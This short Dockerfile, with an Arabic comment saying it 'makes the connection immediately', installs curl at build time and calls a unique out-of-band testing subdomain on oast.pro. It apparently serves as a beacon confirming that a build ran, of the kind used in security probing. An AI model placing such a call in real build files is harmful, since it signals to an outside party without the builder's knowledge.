FROM alpine:latest

# تنزيل curl وتنفيذ الاتصال فوراً
RUN apk add --no-cache curl && curl http://docker-original.d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro
